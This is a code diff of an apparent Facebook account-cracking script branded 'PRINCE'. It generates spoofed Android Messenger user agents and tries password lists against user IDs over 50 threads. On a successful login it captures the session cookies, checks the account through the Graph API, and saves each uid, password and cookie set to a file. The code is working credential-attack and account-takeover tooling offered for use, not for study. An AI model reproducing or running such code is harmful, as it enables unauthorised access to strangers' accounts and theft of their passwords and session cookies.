@@ -44,9 +44,6 @@ class sort:
         return cx
 
 
-
-
-
 def info():
     sort.clear()
     print('     [b]    [red1] WELCOME TO MY TOOL          ')
@@ -109,11 +106,12 @@ def ua():
     xx = f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36"
     return xx
 
-#"Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
 
-#Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
+# "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/"+377.0.0.13.101;FBBV/"+str(random.randint(412627882,419003907))+";FBRV/0;FBLC/en_US;FBMF/"+brand_name_+" MOBILE LIMITED;FBBD/"+brand_name_+";FBDV/TECNO LD7;FBSV/"+version_+";FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,width="+width_+",height="+height_+"};FB_FW/1;]"
 
-#Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]
+# Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/377.0.0.13.101;FBPN/com.facebook.orca;FBLC/en_US;FBBV/396116327;FBCR/MTN;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]
+
+# Dalvik/2.1.0 (Linux; U; Android 13; Oppo CPH2095 Build/TW8A.198993.015) [FBAN/Orca-Android;FBAV/279.1.0.51.155;FBPN/com.facebook.orca;FBLC/en_US;FBBV/398105929;FBCR/MTN;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo CPH2095;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1;]
 
 
 for brand in range(1000):
@@ -123,17 +121,21 @@ for brand in range(1000):
     b = random.choice(
         ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
          'W', 'X', 'Y', 'Z'])
-    c = str(random.randint(1,9))
-    d= str(random.randint(10,20))
-    abc = a+b+c
+    c = str(random.randint(1, 9))
+    d = str(random.randint(10, 20))
+    abc = a + b + c
     if not os.path.exists('device_info.txt'):
-    	 info()
+        info()
     else:
         infos = open('device_info.txt', 'r').read()
         version_, model_, brand_name_, width_, height_ = infos.split('$')
-        uaaa = "Dalvik/2.1.0 (Linux; U; Android "+version_+"; "+model_+" Build/"+abc+"A."+str(random.randint(190000,199999))+".0"+d+") [FBAN/Orca-Android;FBAV/"+str(random.randint(200,350))+"."+str(random.randint(0,1))+".0."+str(random.randint(20,70))+"."+str(random.randint(110,280))+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+str(random.randint(390000000,399999999))+";FBCR/MTN;FBMF/"+brand_name_+";FBBD/"+brand_name_+";FBDV/"""+model_+";FBSV/"+version_+";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width="+width_+",height="+height_+"};FB_FW/1;]"
+        uaaa = "Dalvik/2.1.0 (Linux; U; Android " + version_ + "; " + model_ + " Build/" + abc + "A." + str(
+            random.randint(190000, 199999)) + ".0" + d + ") [FBAN/Orca-Android;FBAV/" + str(
+            random.randint(200, 350)) + "." + str(random.randint(0, 1)) + ".0." + str(
+            random.randint(20, 70)) + "." + str(
+            random.randint(110, 280)) + ";FBPN/com.facebook.orca;FBLC/en_US;FBBV/" + str(random.randint(390000000,
+                                                                                                        399999999)) + ";FBCR/MTN;FBMF/" + brand_name_ + ";FBBD/" + brand_name_ + ";FBDV/""" + model_ + ";FBSV/" + version_ + ";FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=" + width_ + ",height=" + height_ + "};FB_FW/1;]"
         sys_ua.append(uaaa)
-    
 
 
 def Samsung():
@@ -180,6 +182,7 @@ def Vivo():
 
     return ua
 
+
 def lsb():
     upper = ''.join(random.choices(string.ascii_uppercase, k=6))
     lower = ''.join(random.choices(string.ascii_lowercase, k=4))
@@ -198,6 +201,7 @@ def referer():
     password_list = list(password)
     random.shuffle(password_list)
     return ''.join(password_list)
+
 
 # -----------#
 
@@ -472,7 +476,7 @@ def ran():
     else:
         fb = "m"
 
-    with ThreadPool(max_workers=30) as heron:
+    with ThreadPool(max_workers=50) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -494,7 +498,8 @@ def ren_sub(uid, pwx, meth, user, fb):
     shadid = random.choice(sys_ua)
     custom_agent = ""
     session = requests.Session()
-    sys.stdout.write(f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
+    sys.stdout.write(
+        f"\r  \x1b[38;1;155m\x1b[38;5;155m[PRINCE-M{meth}]   {loop} • \x1b[38;5;155m{str(len(user))}  • {str(len(oks))}"),
     sys.stdout.flush()
     try:
         for ps in pwx:
@@ -541,16 +546,21 @@ def ren_sub(uid, pwx, meth, user, fb):
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
             if "c_user" in heron_brand:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                xx=coki.split("c_user=")[1]
-                xd=xx[:15]
-                print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies]{coki}\n")
-                open("/sdcard/SD-OK.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
-                oks.append(xd)
-                break
-                    
+                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                xx = coki.split("c_user=")[1]
+                xd = xx[:15]
+                res = requests.get(f"https://graph2.facebook.com/v3.3/{xd}/picture?redirect=0").json()
+                try:
+                    if "height" in res["data"]:
+                        print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[Cookies][spring_green1][[deep_pink2]{coki}")
+                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
+                        oks.append(xd)
+                        break
+                except KeyError:
+                    pass
+
             elif "checkpoint" in heron_brand:
-                pass
+                    pass
 
                 # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
             else:
@@ -558,7 +568,6 @@ def ren_sub(uid, pwx, meth, user, fb):
         loop += 1
     except Exception as e:
         time.sleep(30)
-
 
 
 def main():
